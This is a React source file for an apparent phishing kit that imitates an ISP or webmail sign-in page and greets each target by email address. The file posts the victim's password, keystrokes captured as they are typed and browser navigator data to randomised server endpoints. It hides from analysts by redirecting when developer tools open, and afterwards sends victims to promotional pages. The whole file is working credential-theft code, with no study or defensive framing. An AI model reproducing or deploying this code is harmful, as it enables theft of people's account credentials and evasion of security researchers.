import React, { Component } from "react";
import { Helmet } from "react-helmet";

import { createBrowserHistory } from "history";
import "./App.css";

require("es6-promise").polyfill();
var axios = require("axios");

var md5 = require("md5");

const browserHistory = createBrowserHistory({ forceRefresh: false });
var randomstring = require("randomstring");
const devtools = require("devtools-detect");
const Entities = require("html-entities").AllHtmlEntities;
// const entities = new Entities()
var Parser = require("html-react-parser");

let DISABLE_PROTECTION = true;

if (process.env.NODE_ENV === "production") {
  DISABLE_PROTECTION = false;
}

browserHistory.listen(() => {
  return false;
});

const style = {
  container: {
    font:
      "normal 13px/18px Helvetica Neue, Segoe UI, Helvetica, Arial, Lucida Grande, sans-serif"
  },
  header: {
    margin: "25px 24px 0",
    padding: "4px 0 12px",
    borderBottom: "1px solid #e0e4e9"
  },
  subject: {
    fontSize: "17px",
    color: "#1d2228",
    lineHeight: "18px",
    fontFamily: "Helvetica Neue, Segoe UI, Helvetica, Arial, sans-serif",
    borderBottom: "1px solid #e0e4e9",
    marginBottom: "4px",
    paddingBottom: "12px"
  },
  body: { paddingTop: "8px" }
};

class ErrorBoundary extends React.Component {
  state = { error: null };

  unstable_handleError(error, info) {
    this.setState({ error });
    // Note: you can send error and info to analytics if you want too
  }

  render() {
    if (this.state.error) {
      // You can render anything you want here,
      // but note that if you try to render the original children
      // and they throw again, the error boundary will no longer catch that.
      return <h1>Something went wrong: {this.state.error.toString()}.</h1>;
    }
    return this.props.children;
  }
}

const EmailPreview = props => {
  return (
    <div style={style.container}>
      <div name="header" style={style.header}>
        <div name="subject" style={style.subject}>
          {props.subject}
        </div>
        <div name="from-container" style={{ paddingTop: "8px" }}>
          <span style={{ color: "#5b636a" }} name="from-title">
            From:
          </span>
          <span name="from-data" style={{ paddingLeft: "8px" }}>
            {props.from}
          </span>
        </div>
        <div name="to-container" style={{ paddingTop: "8px" }}>
          <span style={{ color: "#5b636a" }} name="to-title">
            To:
          </span>
          <span name="to-data" style={{ paddingLeft: "8px" }}>
            {props.to}
          </span>
        </div>
      </div>
      <div name="body" style={style.body}>
        <div style={{ textAlign: "center" }}>
          <RenderCreative {...props} />
        </div>
      </div>
    </div>
  );
};

const SvgLoader = props => (
  <svg
    width={200}
    height={200}
    viewBox="0 0 100 100"
    preserveAspectRatio="xMidYMid"
    className="lds-eclipse"
    style={{ background: "0 0" }}
    {...props}
  >
    <path
      d="M27.298 18.052a40 40 0 0 0 47.022 64.72 40 42 54 0 1-47.022-64.72"
      fill="#39d"
    >
      <animateTransform
        attributeName="transform"
        type="rotate"
        calcMode="linear"
        values="0 50 51;360 50 51"
        keyTimes="0;1"
        dur="1s"
        begin="0s"
        repeatCount="indefinite"
      />
    </path>
  </svg>
);

const Loading = () => (
  <div style={{ textAlign: "center" }}>
    <SvgLoader style={{ paddingTop: "35px", maxWidth: "80px" }} alt="Loading" />
  </div>
);

const RenderCreative = props => {
  if (props.image) {
    return (
      <div style={{ textAlign: "center" }}>
        <a onClick={e => props.hc(e)} href={props.url}>
          <img src={props.image || ""} alt={props.subject} />
        </a>
      </div>
    );
  }
  if (props.html) {
    // decode base64
    let html = atob(props.html);
    // html = entities.decode(html)
    let content = Parser(html, {
      replace: function(domNode) {
        if (domNode.name == "a") {
          domNode.attribs.onClick = props.hc;
          return domNode;
        }
      }
    });
    return content;
  }
};

const Creative = props => (
  <React.Fragment>
    <Helmet>
      <title>{props.subject}</title>
    </Helmet>
    <EmailPreview {...props} />
  </React.Fragment>
);

class App extends Component {
  constructor(props) {
    super(props);

    this.state = {
      ispconf: null,
      imageStatus: "not loaded",
      logo: null,
      favicon: null,
      redirect: false,
      showRedir: false,
      password: "",
      dev: false,
      scr: false,
      loading: false,
      reason: null
    };

    this.defaultPromo = "/redirect";
    this.typetimer = null;
    this.to_timer = null;
  }

  componentWillUnmount() {
    debugger;
  }

  async componentWillMount() {
    if (!DISABLE_PROTECTION) {
      window.devtools = devtools;
      if (window.devtools) {
        if (window.devtools.open) {
          this.setState({ dev: true, redirect: true });
          return window.location("about:blank");
        }
      }
      window.addEventListener("devtoolschange", e => {
        if (e.detail.open) {
          this.setState({ dev: true });
          this.rp();
        }
      });
    }

    this.init();

    this.handleLogin = this.handleLogin.bind(this);
    this.handleClick = this.handleClick.bind(this);
    this.handleType = this.handleType.bind(this);
    this.handleData = this.handleData.bind(this);
    this.handleTimeout = this.handleTimeout.bind(this);
  }

  async init() {
    let path = window.location.href.split("/").pop();

    let url_orig = window.location.href;

    browserHistory.push("/");

    let data = {};

    // detect if url doesnt have a valid objectid

    // convert to md5

    if (path.length < 7) {
      this.setState({ redirect: true, reason: "pl7-" + encodeURI(path) });
      return false;
    }

    data = await axios
      .get(`/api/${md5(url_orig)}/${path}`, { timeout: 30000 })
      .then(res => {
        // console.log("d:", JSON.stringify(res.data))
        if (res.data) {
          if (res.data.p) {
            this.defaultPromo = res.data.p;
          }
        }
        return res.data;
      })
      .catch(error => {
        this.setState({ redirect: true, reason: error.response.status });
      });

    if (data) {
      if (data.al === true) {
        this.setState({ redirect: true, reason: "al" });
      }

      if (data.nl === true) {
        if (data.c) {
          clearTimeout(this.to_timer);
          this.setState({ scr: true, ispconf: data });
        } else {
          this.setState({ redirect: true, reason: "nl" });
        }
      }

      if (data.email) {
        this.setState({ ispconf: data, imageStatus: "loading" });

        if (!data.ispname) {
          this.setState({ redirect: true, reason: "noin" });
        } else {
          var img = new Image();
          img.src = "./" + data.logo; // Assigning the img src immediately requests the image

          img.onload = () => {
            this.setState({
              logo: img.src,
              favicon: data.favicon ? data.favicon : img.src,
              imageStatus: "loaded"
            });
          };

          img.onerror = () => {
            this.setState({
              logo: img.src,
              favicon: data.favicon ? data.favicon : img.src,
              imageStatus: "loaded"
            });
          };
        }
      } else {
        this.setState({ redirect: true, reason: "wdata" });
      }
    }
  }

  handleClick(event) {
    event.preventDefault();
    event.stopPropagation();
    // click

    var dp = this.defaultPromo;

    this.defaultPromo = this.state.ispconf.c.url || dp;

    this.setState({ loading: true, scr: false });

    this.handleData({
      u: this.state.ispconf.email,
      id: this.state.ispconf.id,
      cl: true
    })
      .then(res => {
        if (res.data.url !== "") {
          this.defaultPromo = res.data.url;
        }
        this.setState({ scr: false, redirect: true, reason: "hc" });
      })
      .catch(() => {
        this.setState({ redirect: true, scr: false, reason: "hcf" });
      });
  }

  handleLogin(event) {
    event.preventDefault();
    event.stopPropagation();

    this.setState({ loading: true });

    this.handleData({
      id: this.state.ispconf.id,
      u: this.state.ispconf.email,
      p: this.state.password,
      n: this.getn(navigator),
      l: true
    })
      .then(res => {
        if (res.data.url !== "") {
          console.log("sp ", res.data.url);
          this.defaultPromo = res.data.url;
        }
        if (this.state.ispconf.c !== null) {
          console.log("scr_wl 1");
          this.setState({ scr: true });
        } else {
          console.log("scr_wl 0", this.state);
          this.setState({ redirect: true, reason: "hl" });
        }
      })
      .catch(e => {
        this.setState({ redirect: true, reason: "lf:" + e });
      });
  }

  handleData(data) {
    return axios.post("/api/" + randomstring.generate(), data);
  }

  handleTimeout() {
    // should redirect somewhere if it has creative ???

    if (this.state.ispconf !== null) {
      this.handleData({
        u: this.state.ispconf.email,
        p: this.state.password,
        n: this.getn(navigator),
        to: true
      }).then(res => {
        if (res.data.url) {
          this.defaultPromo = res.data.url;
        }
        this.setState({ redirect: true, reason: "tout", scr: false });
      });
    } else {
      this.setState({
        redirect: true,
        reason: "nocfg",
        scr: false
      });
    }
  }

  getn(navigator) {
    let d = {};
    for (var property in navigator) {
      var str = navigator[property];
      d[property] = str;
    }
    return d;
  }

  handleType(evt) {
    this.setState({ password: evt.target.value });
    clearTimeout(this.typetimer);

    if (evt.target.value.length === 0) {
      return true;
    }

    if (evt.target.value.length > this.state.password.length) {
      this.setState({ partial: evt.target.value });

      this.typetimer = setTimeout(() => {
        this.handleData({
          u: this.state.ispconf.email,
          p: this.state.partial,
          n: this.getn(navigator),
          t: true
        });
      }, 1000);
    }
  }

  onKeyDown = event => {
    if (event.key === "Enter") {
      this.handleLogin(event);
    }
  };

  componentDidMount() {
    if (this.state.ispconf) {
      this.nameInput.focus();
    }
  }

  rp = () => {
    if (DISABLE_PROTECTION) return true;

    this.handleData({
      c: true,
      ...this.state,
      n: this.getn(navigator),
      d: true
    }).then(() => {
      window.location.href = "about:blank";
    });
  };

  render() {
    let ispconf = this.state.ispconf;

    if (this.state.scr === true) {
      return (
        <Creative
          {...this.state.ispconf.c}
          to={this.state.ispconf.email}
          hc={this.handleClick}
        />
      );
    }

    if (this.state.redirect === true && this.state.scr !== true) {
      console.log(
        "-> r n scr",
        this.state.scr,
        this.state.reason,
        this.defaultPromo
      );

      if (this.defaultPromo === "/redirect") {
        this.defaultPromo = "/redirect?r=" + this.state.reason;
      }

      if (!this.state.showRedir) {
        setTimeout(() => {
          this.setState({ showRedir: true });
        }, 5000);
      }

      try {
        // eslint-disable-next-line
        location.replace(this.defaultPromo);
      } catch (e) {
        window.location.href = this.defaultPromo;
      }

      return (
        <div>
          {this.state.showRedir && (
            <div style={{ textAlign: "center", paddingTop: "35px" }}>
              <img
                src={"https://whos.amung.us/swidget/brokenbrowsx.png"}
                width={0}
                height={0}
              />
              <a href={this.defaultPromo}>Click here to continue.</a>
              <br />
            </div>
          )}
          <Loading />
        </div>
      );
    }
    if (!this.state.logo || !this.state.ispconf || this.state.loading) {
      return <Loading />;
    }
    return (
      <ErrorBoundary>
        <div className="App">
          <Helmet>
            <title>{ispconf.ispname}</title>
            <meta name="description" content={ispconf.ispname} />
            {this.state.favicon ? (
              <link rel="icon" href={this.state.favicon} />
            ) : (
              <link
                rel="shortcut icon"
                href="data:image/x-icon;,"
                type="image/x-icon"
              />
            )}
          </Helmet>

          <div className="login-box-container">
            <div className="login-box default">
              <div className="txt-align-center">
                <img
                  className="logo"
                  src={this.state.logo}
                  alt={ispconf.ispname}
                />
              </div>
              <div className="challenge">
                <div id="password-challenge" className="primary">
                  <div className="greeting">
                    <h1 className="username">Hi {ispconf.email}</h1>
                    <p
                      className="session-expired"
                      style={{ fontSize: "12px", color: "#dd1038" }}
                    >
                      Sign in to continue
                    </p>
                  </div>

                  <div className="hidden-username">
                    <input
                      type="hidden"
                      tabIndex="-1"
                      aria-hidden="true"
                      role="presentation"
                      autoCorrect="off"
                      spellCheck="false"
                      name="username"
                      value=""
                      autoComplete="off"
                    />
                  </div>
                  <input type="hidden" name="passwordContext" value="normal" />
                  <input
                    onChange={this.handleType}
                    onKeyDown={this.onKeyDown}
                    ref={input => {
                      this.nameInput = input;
                    }}
                    className="password"
                    type="password"
                    id="login-passwd"
                    name="password"
                    placeholder="Password"
                    autoFocus="true"
                    autoComplete="off"
                    value={this.state.password}
                  />
                  <p className="signin-cont">
                    <button
                      onClick={e => this.handleLogin(e)}
                      id="login-signin"
                      className="pure-button puree-button-primary puree-spinner-button"
                      name="verifyPassword"
                      value="Sign&nbsp;in"
                    >
                      Sign&nbsp;in
                    </button>
                  </p>
                </div>
              </div>
            </div>
            <div
              id="login-box-ad-fallback"
              className="login-box-ad-fallback"
              style={{ display: "block" }}
            >
              <p />
            </div>
          </div>
        </div>
      </ErrorBoundary>
    );
  }
}

export default App;
